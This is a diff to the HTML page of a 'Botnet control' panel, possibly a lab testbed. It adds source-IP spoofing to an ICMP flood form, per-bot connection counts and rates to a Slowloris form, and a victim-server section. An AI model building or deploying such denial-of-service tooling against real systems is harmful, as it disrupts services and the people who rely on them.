@@ -6,6 +6,8 @@
     <title>Botnet control</title>
   </head>
   <body>
+    <!-- BOTNET CONFIG -->
+
     <form id="generate_botnet_form" method="post" action="/generate_botnet">
       <h1>Botnet configuration</h1>
       <label for="bots_number">Number of bots:</label>
@@ -72,6 +74,9 @@
       <input type="submit" value="Show botnet" name="action1" />
     </form>
     <hr />
+
+    <!-- ATTACK CONFIG -->
+
     <h1>Attack configuration</h1>
     <button id="ping">Ping</button>
 
@@ -79,15 +84,31 @@
       <option value="">Select an attack</option>
       <option value="option1" data-form="icmp_flood">ICMP Flood</option>
       <option value="option2" data-form="slowloris_form">Slowloris</option>
-      <!-- Add more options here as needed -->
     </select>
-
+    <br />
     <form
       id="icmp_flood"
       class="option-form"
       style="display: none"
       action="/icmp_flood"
     >
+      <label for="spoof">Spoof the source address?</label>
+      <select id="spoof_select" name="spoof">
+        <option value="no">No</option>
+        <option value="yes">Yes</option>
+      </select>
+      <div id="ip_address_input" style="display: none">
+        <label for="ip_address">Spoofed IP address:</label>
+        <input
+          type="text"
+          id="ip_address"
+          name="ip_address"
+          placeholder="Enter IP address"
+          value="1.2.3.4"
+        />
+      </div>
+
+      <br />
       <input type="submit" value="Run ICMP flood" />
       <button id="stop_attack">Stop attack</button>
     </form>
@@ -98,7 +119,7 @@
       class="option-form"
       style="display: none"
     >
-      <label for="number_of_connections">Number of connections:</label>
+      <label for="number_of_connections">Number of connections per bot:</label>
 
       <input
         type="number"
@@ -108,9 +129,22 @@
         value="50"
       />
       <br />
+      <label for="connection_rate">Connection rate per second:</label>
+
+      <input
+        type="number"
+        id="connection_rate"
+        name="connection_rate"
+        min="1"
+        value="50"
+      />
       <input type="submit" value="Run slowloris" />
     </form>
+
     <hr />
+
+    <h1>Victim server configuration</h1>
+
     <div
       style="
         display: flex;
